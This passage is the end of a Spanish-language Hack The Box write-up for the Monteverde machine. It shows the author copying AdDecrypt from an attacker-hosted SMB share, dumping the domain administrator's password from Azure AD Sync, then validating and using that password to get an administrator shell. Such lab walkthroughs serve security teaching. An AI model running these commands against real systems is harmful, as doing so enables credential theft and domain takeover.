+*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; type user.txt
+603f2f5e0f8e217d541fb0572da2d55c
+</code></pre>
+
+<h2 id="elevacion-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#elevacion-de-privilegios">#</a></h2>
+
+<p>Si listamos los grupos a los cuales pertenece el usuario <code>mhope</code>, podemos notar que esta dentro del grupo <code>Azure admins</code></p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; net user mhope
+User name                    mhope
+Full Name                    Mike Hope
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/2/2020 4:40:05 PM
+Password expires             Never
+Password changeable          1/3/2020 4:40:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory               \\monteverde\users$\mhope
+Last logon                   10/13/2023 3:52:10 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Azure Admins         *Domain Users
+The command completed successfully.
+</code></pre>
+
+<p>Cuando un usuario pertenece a un grupo <code>Azure</code> debemos de dirigirnos al directorio raiz, y dentro buscar directorios relacionados a <code>Azure</code>.</p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; cd C:\
+*Evil-WinRM* PS C:\&gt; dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/15/2018  12:19 AM                PerfLogs
+d-r---         1/3/2020   5:28 AM                Program Files
+d-----         1/2/2020   2:39 PM                Program Files (x86)
+d-r---         1/3/2020   5:24 AM                Users
+d-----       10/25/2022   2:29 AM                Windows
+
+
+*Evil-WinRM* PS C:\&gt; cd Progra~1
+*Evil-WinRM* PS C:\Program Files&gt; dir
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/2/2020   9:36 PM                Common Files
+d-----         1/2/2020   2:46 PM                internet explorer
+d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
+d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
+d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
+d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
+d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
+d-----         1/2/2020   2:38 PM                Microsoft SQL Server
+d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
+d-----         1/2/2020   2:32 PM                Microsoft.NET
+d-----         1/3/2020   5:28 AM                PackageManagement
+d-----         1/2/2020   9:37 PM                VMware
+d-r---         1/2/2020   2:46 PM                Windows Defender
+d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
+d-----        9/15/2018  12:19 AM                Windows Mail
+d-----         1/2/2020   2:46 PM                Windows Media Player
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
+d-----        9/15/2018  12:28 AM                windows nt
+d-----         1/2/2020   2:46 PM                Windows Photo Viewer
+d-----        9/15/2018  12:19 AM                Windows Portable Devices
+d-----        9/15/2018  12:19 AM                Windows Security
+d-----         1/3/2020   5:28 AM                WindowsPowerShell
+</code></pre>
+
+<p>Curiosamente vemos uno de nombre <code>Microsoft Azure AD Sync</code>, y si investigamos un poco, encontramos un exploit de escalada de privilegios, que lo que hace concretamente es dumpear las credenciales del administrador del dominio.</p>
+
+<p>Te dejo aqui el articulo para que veas mas al respecto:</p>
+
+<ul>
+  <li><a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/</a></li>
+</ul>
+
+<p>Lo que tenemos que hacer primero es descargarnos el <code>AdDecrypt.zip</code> del repositorio de <code>github</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/VbScrub/AdSyncDecrypt/releases">https://github.com/VbScrub/AdSyncDecrypt/releases</a></li>
+</ul>
+
+<p>Lo descomprimimos y dentro vamos a tener dos archivos los cuales tenemos que subir a la maquina victima.</p>
+
+<pre><code class="language-bash">❯ ls
+ AdDecrypt.zip   azure.xml   credentials.txt   users.txt
+❯ unzip AdDecrypt.zip
+Archive:  AdDecrypt.zip
+  inflating: AdDecrypt.exe           
+  inflating: mcrypt.dll              
+❯ ls
+ AdDecrypt.exe   AdDecrypt.zip   azure.xml   credentials.txt   mcrypt.dll   users.txt
+</code></pre>
+
+<p>Nos creamos un directorio y subimos los archivos, lo que yo hare es que con <code>smbserver</code> crearme un recurso compartido para subirlos, pero puedes hacerlo como quieras.</p>
+
+<pre><code class="language-bash">❯ impacket-smbserver smbFolder $(pwd) -smb2support
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; mkdir Privesc
+*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&gt; copy \\10.10.16.10\smbFolder\AdDecrypt.exe AdDecrypt.exe
+*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&gt; copy \\10.10.16.10\smbFolder\mcrypt.dll mcrypt.dll
+*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&gt; dir
+
+    Directory: C:\Users\mhope\Desktop\Privesc
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/13/2020   9:11 PM          14848 AdDecrypt.exe
+-a----        1/12/2020   6:33 PM         334248 mcrypt.dll
+</code></pre>
+
+<p>Finalmente debemos ejecutar el siguiente comando <code>AdDecrypt.exe -FullSQL</code>, pero debemos hacerlo desde el siguiente directorio <code>C:\Program Files\Microsoft Azure AD Sync\Bin</code>.</p>
+
+<p>Ahora recordemos que debemos ejecutar el <code>AdSyncDecrypt.exe</code> desde la ruta donde lo subimos.</p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; C:\Users\mhope\Desktop\Privesc\AdDecrypt.exe -FullSQL
+
+======================
+AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
+Based on original code from: https://github.com/fox-it/adconnectdump
+======================
+
+Opening database connection...
+Executing SQL commands...
+Closing database connection...
+Decrypting XML...
+Parsing XML...
+Finished!
+
+DECRYPTED CREDENTIALS:
+Username: administrator
+Password: d0m@in4dminyeah!
+Domain: MEGABANK.LOCAL
+</code></pre>
+
+<p>Validamos las credenciales administrativas <code>administrator:d0m@in4dminyeah!</code>.</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.172 -u 'administrator' -p 'd0m@in4dminyeah!'
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!)
+</code></pre>
+
+<p>Nos conectamos como el usuario <code>administrator</code> con <code>Evil-WinRM</code> y podemos visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.10.172 -u 'administrator' -p 'd0m@in4dminyeah!'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+6154d420f50cd70c919a6fb1e96e56fc
+</code></pre>
+
+<p>y listo maquina finiquitada! 😆</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Monteverde - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Monteverde" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
